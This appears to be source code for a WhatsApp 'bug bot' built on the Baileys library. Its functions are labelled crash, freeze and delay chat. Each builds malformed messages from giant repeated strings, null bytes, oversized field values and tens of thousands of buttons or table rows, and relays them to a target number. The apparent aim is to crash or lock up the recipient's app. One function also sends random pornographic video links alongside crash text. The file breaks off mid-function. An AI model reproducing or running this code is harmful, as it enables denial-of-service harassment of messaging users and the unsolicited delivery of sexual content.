const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
const thumb = "https://files.catbox.moe/3p0udg.jpg";

//---- Function Crash Chat
async function SpamVokep(sock, targetJid) {
  const VidVokepNted = [
    "https://files.catbox.moe/8c7gz3.mp4",
    "https://files.catbox.moe/nk5l10.mp4",
    "https://files.catbox.moe/r3ip1j.mp4",
    "https://files.catbox.moe/71l6bo.mp4",
    "https://files.catbox.moe/rdggsh.mp4",
    "https://files.catbox.moe/3288uf.mp4",
    "https://files.catbox.moe/jdopgq.mp4",
    "https://files.catbox.moe/8ca9cw.mp4",
    "https://files.catbox.moe/b99qh3.mp4",
    "https://files.catbox.moe/6bkokw.mp4",
    "https://files.catbox.moe/ebisdh.mp4",
    "https://files.catbox.moe/3yko44.mp4",
    "https://files.catbox.moe/apqlvo.mp4",
    "https://files.catbox.moe/wqe1r7.mp4",
    "https://files.catbox.moe/nk5l10.mp4",
    "https://files.catbox.moe/8c7gz3.mp4",
    "https://files.catbox.moe/wqe1r7.mp4",
    "https://files.catbox.moe/n37liq.mp4",
    "https://files.catbox.moe/0728bg.mp4",
    "https://files.catbox.moe/p69jdc.mp4",
    "https://files.catbox.moe/occ3en.mp4",
    "https://files.catbox.moe/y8hmau.mp4",
    "https://files.catbox.moe/tvj95b.mp4",
    "https://files.catbox.moe/3g2djb.mp4",
    "https://files.catbox.moe/xlbafn.mp4"
  ];

  const VirtexNted = [
    "Awas Ngocok cil\n" + "ꦾ".repeat(50000),
    "Dosa tanggung sendiri" + "ြ".repeat(50000),
    "Jangan sange yah" + "\0".repeat(50000),
    "Jangan sange yah" + "\n".repeat(50000),
    "Jangan sange yah" + "]".repeat(50000),
    "Jangan sange yah" + "[".repeat(50000),
    "Jangan sange yah" + "{}".repeat(50000),
    "Jangan sange yah" + "?".repeat(50000)
  ];

  const videoVokep = VidVokepNted[Math.floor(Math.random() * VidVokepNted.length)];
  const RandomVirtex = VirtexNted[Math.floor(Math.random() * VirtexNted.length)];
 
 await sock.sendMessage(targetJid, {
   video: { url: videoVokep },
    caption: RandomVirtex
   }, {
    participant: true
  });
}

async function sqlMemory2(sock, targetJid) {
    const msg = generateWAMessageFromContent(
      targetJid,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                  fileLength: 9999,
                  height: 9999,
                  width: 9999,
                  mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                  fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                  directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1776937541",
                  jpegThumbnail: null,
                  caption: "\0",
                  scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                  scanLengths: [
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999
                  ],
                  midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                }
              },
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "?".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                    fileLength: 9999,
                    height: 9999,
                    width: 9999,
                    mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                    fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                    directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1776937541",
                    jpegThumbnail: null,
                    caption: "⿻ ¡ Nted 𖣂︎ Crasher ¡ ⿻ ",
                    scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                    scanLengths: [
                      9999999999999999999,
                      9999999999999999999,
                      9999999999999999999,
                      9999999999999999999
                    ],
                    midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                  }
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(targetJid, msg.message, {
      participant: true
    });
}
async function sqlMemory3(sock, targetJid) {
    const msg = generateWAMessageFromContent(
      targetJid,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/612887405_1743334443677021_1134020113266282489_n.enc?ccb=11-4&oh=01_Q5Aa5AE6PQZVQ5lXWqQqe0xSAzJ52eOgtM5UcQq0lETNf3e1Gw&oe=6A760CFA&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "pcmMCrrMZkZ566PsoWBTeGvECyJMkNWlimdAvFtBJII=",
                  fileLength: "212298",
                  height: 1599,
                  width: 899,
                  mediaKey: "OjrpnIsQXGSRI1A2G6YDwuFQhTE6HVkQNiDnFmEk7oc=",
                  fileEncSha256: "9pOzih2R3IpW43VrJY4Z1oL3AiWxemfi7WMMvIlvgdo=",
                  directPath: "/v/t62.7118-24/612887405_1743334443677021_1134020113266282489_n.enc?ccb=11-4&oh=01_Q5Aa5AE6PQZVQ5lXWqQqe0xSAzJ52eOgtM5UcQq0lETNf3e1Gw&oe=6A760CFA&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1783542985",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JdXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAIQMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8GrXY1BcqojRW61U4nJa47pQwKbJly+1F5t6ABvMrF6LadNCf//EACQQAAICAQMEAgMAAAAAAAAAAAECABEDEiExBBATQSJRUmGB/9oACAEBAAE/APHURxsNM14tW6kTNXkNcdgoqaNwZ8C25nVYwhUj32DsK3iODyYwxmi0zucjfodlx2AKmLpC5pdpl6PKlkCxCrjlZZ/EwOoNgzFnC7A2DMObEzFLmSgxri58YMC0DMqEC0ETIwZQNjCTLP0ISo2BmNlDHVxHxK3r+iKoUVNJ+5h5YxjtcRjc9zSJ/8QAGREBAAMBAQAAAAAAAAAAAAAAAQAQEQIh/9oACAECAQE/AJtKHrBGujSBTf8A/8QAGBEBAAMBAAAAAAAAAAAAAAAAAQAQESD/2gAIAQMBAT8AmclkSv/Z",
                  scansSidecar: "3dEf93ZjwQo7+DB5But3eDBFBTtySKirejBuTbGA2jL0gD172kUomQ==",
                  contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true
                  }
                },
                hasMediaAttachment: true,
                title: "⿻𖣂︎ .¡ Nted Crasher ¡. 𖣂︎⿻"
              },
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                buttons: "\n".repeat(500000)
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(targetJid, msg.message, {
      participant: true
    });
}
async function TrashWazap(sock, targetJid) {
const msg = generateWAMessageFromContent(targetJid, {
  groupStatusMessageV2: {
   message: {
    interactiveMessage: {
     header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/612887405_1743334443677021_1134020113266282489_n.enc?ccb=11-4&oh=01_Q5Aa5AE6PQZVQ5lXWqQqe0xSAzJ52eOgtM5UcQq0lETNf3e1Gw&oe=6A760CFA&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "pcmMCrrMZkZ566PsoWBTeGvECyJMkNWlimdAvFtBJII=",
        fileLength: "212298",
        height: 1599,
        width: 899,
        mediaKey: "OjrpnIsQXGSRI1A2G6YDwuFQhTE6HVkQNiDnFmEk7oc=",
        fileEncSha256: "9pOzih2R3IpW43VrJY4Z1oL3AiWxemfi7WMMvIlvgdo=",
        directPath: "/v/t62.7118-24/612887405_1743334443677021_1134020113266282489_n.enc?ccb=11-4&oh=01_Q5Aa5AE6PQZVQ5lXWqQqe0xSAzJ52eOgtM5UcQq0lETNf3e1Gw&oe=6A760CFA&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1783542985",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JdXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADwAIQMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8GrXY1BcqojRW61U4nJa47pQwKbJly+1F5t6ABvMrF6LadNCf//EACQQAAICAQMEAgMAAAAAAAAAAAECABEDEiExBBATQSJRUmGB/9oACAEBAAE/APHURxsNM14tW6kTNXkNcdgoqaNwZ8C25nVYwhUj32DsK3iODyYwxmi0zucjfodlx2AKmLpC5pdpl6PKlkCxCrjlZZ/EwOoNgzFnC7A2DMObEzFLmSgxri58YMC0DMqEC0ETIwZQNjCTLP0ISo2BmNlDHVxHxK3r+iKoUVNJ+5h5YxjtcRjc9zSJ/8QAGREBAAMBAQAAAAAAAAAAAAAAAQAQEQIh/9oACAECAQE/AJtKHrBGujSBTf8A/8QAGBEBAAMBAAAAAAAAAAAAAAAAAQAQESD/2gAIAQMBAT8AmclkSv/Z",
        scansSidecar: "3dEf93ZjwQo7+DB5But3eDBFBTtySKirejBuTbGA2jL0gD172kUomQ==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
         }
       },
       hasMediaAttachment: true,
       title: "⿻𖣂︎ .¡ Nted Crasher ¡. 𖣂︎⿻"
      },
      body: {
        text: "᬴".repeat(5000)
       },
      nativeFlowMessage: {
         buttons: "?".repeat(500000)
        }
      }
    }
  }
}, {});

await sock.relayMessage(targetJid, msg.message, {
    participant: true
  });
}
//---- Function Freeze Chat
async function FreezeChat(sock, targetJid) {
 await sock.relayMessage(targetJid, {
   messageContextInfo: {
     deviceListMetadata: {},
     deviceListMetadataVersion: 2,
     botMetadata: {
       pluginMetadata: {},
       richResponseSourcesMetadata: { sources: [] }
    }
  },
  botForwardedMessage: {
    message: {
      richResponseMessage: {
        messageType: 1,
        submessages: [
          {
          messageType: 4,
          tableMetadata: {
            title: "𖣂︎ 𝐍𝐓𝐄𝐃 ⿻ 𝐗𝐓𝐑𝐎𝐕𝐈𝐄 𖣂︎",
              rows: Array.from({ length: 200000 }, () => ({}))
            }
          }
        ],
        unifiedResponse: {
          data: JSON.stringify({
            response_id: crypto.randomUUID(),
            sections: []
          })
        },
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          forwardedAiBotMessageInfo: {
            botJid: "867051314767696@bot"
          },
          forwardOrigin: 4
        }
      }
    }
  }
}, {
   participant: true
 });
}
async function chatlock(sock, targetJid) {
  const msg = {
    interactiveMessage: {
      contextInfo: {
        externalAdReply: {
          title: "\0",
          body: "\0",
          mediaType: 1,
          thumbnail: thumb,
          renderLargerThumbnail: true,
          showAdAttribution: true
        },
        alwaysShowAdAttribution: true
      },
      header: {
        locationMessage: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          name: "\0",
          jpegThumbnail: thumb
        },
        hasMediaAttachment: true
      },
      body: {},
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(20000),
        buttons: [
          {
            name: ""
          },
          ...Array.from({ length: 2000 }, () => ({ name: "cta_url", buttonParamsJson: "\0" })),
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\0"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\0"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\0"
            })
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\0"
            })
          }
        ]
      }
    }
  }

  await sock.relayMessage(targetJid, msg, {
    participant: true
  })
}
async function freezechat(sock, targetJid) {
  await sock.relayMessage(targetJid, {
    interactiveMessage: {
      body: { text: "𖣂︎ NtedBitch ..!" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_cta: "𖣂︎ 𝐍𝐓𝐄𝐃 ⿻ 𝐗𝐓𝐑𝐎𝐕𝐈𝐄 𖣂",
              icon: "REVIEW"
            })
          },
          ...Array.from({ length: 1999 }, () => ({
          name: "cta_url",
          buttonParamsJson: "{}"
          }))
        ]
      }
    }
  }, { participant: true })
}
async function PayX(sock, targetJid) {
await sock.relayMessage(targetJid, {
  interactiveMessage: {
   body: { text: ".! 𖣂︎ Nted • Wazap 𖣂︎ !." },
    nativeFlowMessage: {
     buttons: [
       {
         name: "review_and_pay",
         buttonParamsJson: `{"reference_id":"${"𑇂".repeat(50000)}","currency":"IDR","total_amount":{"value":150000,"offset":100},"order":{"status":"pending","subtotal":{"value":120000,"offset":100},"tax":{"value":30000,"offset":100},"items":[{"name":"${"\0".repeat(9000)}","amount":{"value":12000000,"offset":100},"quantity":1000}]}}`
       }
     ], 
      messageParamsJson: JSON.stringify({
       limited_time_offer: {
        text: "Wazap",
        url: "https://t.me/TceSupportID",
        copy_code: "N | Bug Bot",
        expiration_time: Date.now() * 10000
        },
        tap_targetJid_configuration: {
         title: "Nted WazapBOT",
         description: "./NtedBitch",
         canonical_url: "https://t.me/NtedBitch",
         domain: "https://t.me/NtedBitch",
         button_index: 0
        },
      })
    }
  }
}, {
   participant: true
})
}
//---- Function Delay Chat
async function convQtd(sock, targetJid) {
    await sock.relayMessage(
      targetJid,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'vault!nspect',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {
       participant: true
      }
    );
}
async function invisOOM(sock, targetJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
              fileLength: "93217",
              caption: "7eppsynC",
              height: 1080,
              width: 1080,
              mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
              fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
              directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778142659",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
            },
            title: "7eppsynC",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 50000 }, () => ({}))
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, msg, {
    participant: true
  })
}
async function invisOOM2(sock, targetJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
              fileLength: "93217",
              caption: "7eppsynC",
              height: 1080,
              width: 1080,
              mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
              fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
              directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1778142659",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                isQuestion: true,
                isGroupStatus: true
              },
              scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
            },
            title: "7eppsynC",
            hasMediaAttachment: true
          },
          body: {
            text: "\0"
          },
          nativeFlowMessage: {
            buttons: "?".repeat(500000)
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, msg, {
    participant: true
  })
}
async function annotationz(sock, targetJid) {
  await sock.relayMessage("status@broadcast", {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "dy6rjLbf2Zdmt1V3y15X1WYHEsUXS1DUh4G6yV3fM2I=",
        fileLength: "3557776",
        seconds: 19,
        mediaKey: "QOhY9TSI4bfSBp0Bzj80QyW5EYJ6OQL4Ak3pjb1vUMM=",
        height: 480,
        width: 480,
        fileEncSha256: "g7ZxEPo0YUaHnEYkFfu8BvMh6g4Ib/Y7IzkJFEdZyW0=",
        directPath: "/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc?ccb=11-4&oh=01_Q5Aa4gENOH7knwbjrwHfiP8lJmjeM-Ue-ZVbQJVaVt8p8_OMvQ&oe=6A3D0F90&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779806852",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAABBQEAAAAAAAAAAAAAAAAAAQIDBAUGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAyljXsWcs6SHnV187CNqPOaKTLlsSMLm5znQzZrVqqY+c2+fqriMG7WzmumbuW5oSzka2RLJlddB0tzIDC/Lkvpuuzsi5yrr8tr4iu+zSk7QCEtOgctXzBRK9cKZsodMwDmb/xAAqEAACAgIBAwEIAwEAAAAAAAABAgADBBESISIxQQUQEzJRYXFyFBUjUv/aAAgBAQABPwBah2AHyu4UIXlFqVgDv0hx+zkYKmJYD0nwW0p35iU9xDQVNsiGp+Ji2ntP0GozdugOk9m0/HbTeBL/AGcjdEcifwL6w2tNHrtQAPWeka5/xBd27I7tw3kKCPMrVDUp49d6gp2T11PZKBC3WCMUgCWfeZOHjlGYoJqvR6S8IF7Zj4WU1KlU6GHBzvRJhC/Gv42KRN7ENYaW5dWKwQzMzkej/Mzmw3HYsswzrFo/WGMuwSQDDfYjgfMCY9/DXMamUitkByCymf1r2hmB4j0Eet62KspBmtI0x7QKcf8AWZWWETYgzLLU7FJnwSnDl5MekFQzHosbKWq3cqvruXaP+ZmpTbSeeg3pG6K0qyuxB9BEsW26sOem499dY7dCPkcrVPoDMm7VQ6bU+Zf3WEgECVWvUwKmWX2WNyc7Mb5WieBOWvED2MNlvEoWy5WYAaWZFhqq7bPPpGZnO2PuBjghTBivwU+diGhxrpHQrX9pTZwxbhvzAA9Tf9CFWHke6sgHZjMvB/vP/8QAIxEAAgICAQIHAAAAAAAAAAAAAQIAEQMhEgQxEBMiMkFRcf/aAAgBAgEBPwBSwAjOQauByZbzLdi5evdHG/BLq7mXXGcTGtVu4uRiF9MViNTN3E4jj3mYGigH7OlVtmrrU4/JmYglZ5